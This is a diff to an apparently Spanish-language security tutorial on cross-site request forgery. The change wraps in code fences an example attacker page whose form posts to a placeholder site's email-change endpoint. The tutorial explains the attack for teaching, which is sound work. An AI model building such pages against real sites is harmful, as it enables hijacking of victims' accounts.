@@ -36,6 +36,7 @@ El atacante puede determinar fácilmente los valores de los parámetros de solic
 
 Con estas condiciones establecidas, el atacante puede construir una página web que contenga el siguiente HTML:
 
+````HTML
 <html>
     <body>
         <form action="https://vulnerable-website.com/email/change" method="POST">
@@ -46,6 +47,7 @@ Con estas condiciones establecidas, el atacante puede construir una página web 
         </script>
     </body>
 </html>
+```
 
 Si un usuario víctima visita la página web del atacante, ocurrirá lo siguiente:
 
